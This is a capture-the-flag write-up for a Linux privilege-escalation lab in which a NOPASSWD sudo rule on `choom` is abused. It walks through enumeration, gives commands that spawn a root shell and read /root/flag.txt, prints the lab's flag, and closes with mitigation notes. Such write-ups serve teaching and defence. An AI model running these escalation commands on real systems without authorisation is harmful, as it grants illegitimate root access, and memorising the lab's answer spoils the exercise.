# 0x01 Linux Privilege Escalation — Task 1 (`choom`)

## Objective

Gain elevated (root) privileges on the Linux target and read the flag at:

```text
/root/flag.txt
```

**Target:** Cyber Shell 0x02 — Linux Privesc Task 1  
**Access:** `ssh user@<target-ip>` (password: `user`)

---

## Hint

- Focus on **user permissions** and **available sudo commands**.
- Leverage the **`choom`** command with sudo privileges to escalate and access restricted files.

---

## Enumeration

### 1. Who am I?

```bash
whoami
id
hostname
```

Example output:

```text
user
uid=1000(user) gid=1000(user) groups=1000(user)
```

### 2. Sudo rights (critical)

```bash
sudo -l
```

Result:

```text
User user may run the following commands on <host>:
    (ALL) NOPASSWD: /usr/bin/choom
```

**Finding:** `user` can run `/usr/bin/choom` as **any user (including root)** with **no password**.

### 3. What does `choom` do?

```bash
choom --help
```

```text
Usage:
 choom [options] -p pid
 choom [options] -n number -p pid
 choom [options] -n number command [args...]]

Display and adjust OOM-killer score.
```

`choom` is a util-linux tool for displaying/adjusting the **OOM killer score** of a process.  
Importantly, it can also **execute a command** with a given adjust score:

```text
choom -n number command [args...]
```

When that binary is run via `sudo`, the child command inherits **root** privileges.

### 4. Other quick checks (good practice)

```bash
# Processes
ps aux

# Cron / scheduled tasks
ls -la /etc/cron* 2>/dev/null
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable paths / interesting permissions
find / -writable -type d 2>/dev/null | head
ls -la /etc/sudoers.d/

# Confirm flag location is blocked as normal user
ls /root/
cat /root/flag.txt
# -> Permission denied
```

For this task, **sudo on `choom`** is the intended path.

---

## Exploitation

### Why it works

| Step | Detail |
|------|--------|
| Misconfiguration | `NOPASSWD: /usr/bin/choom` in sudoers |
| Capability abuse | `choom -n <score> <command>` runs `<command>` |
| Result | Command runs as **root** |

This is a classic **GTFOBins-style** sudo abuse: a “harmless” admin utility that can spawn arbitrary programs.

### Exploit commands

Confirm root:

```bash
sudo /usr/bin/choom -n 0 id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the flag:

```bash
sudo /usr/bin/choom -n 0 cat /root/flag.txt
```

Interactive root shell (optional):

```bash
sudo /usr/bin/choom -n 0 /bin/bash
# or, if options clash with the child command:
sudo /usr/bin/choom -n 0 -- /bin/bash -p
```

List `/root` (use `--` so options are not eaten by `choom`):

```bash
sudo /usr/bin/choom -n 0 -- ls -la /root/
```

---

## Flag

```text
24acbe7f1dcbe1d34dfe5d6117cf4d6b
```

Stored in this directory as `0-flag.txt`.

---

## Mitigation (defender notes)

1. **Least privilege:** Do not grant `sudo` on binaries that can execute arbitrary commands (`choom`, `find`, `vim`, `python`, `less`, etc.).
2. **Prefer specific wrappers:** If OOM tuning is required, expose a tightly scoped script/service, not full `choom`.
3. **Audit regularly:**

   ```bash
   sudo -l -U user
   grep -R . /etc/sudoers /etc/sudoers.d/
   ```

4. Check [GTFOBins](https://gtfobins.github.io/) before allowing any sudo binary.

---

## Summary

```text
SSH as user
    -> sudo -l  (NOPASSWD: /usr/bin/choom)
    -> sudo choom -n 0 cat /root/flag.txt
    -> root / flag
```

**Technique:** Sudo misconfiguration + command execution via `choom` → privilege escalation to root.
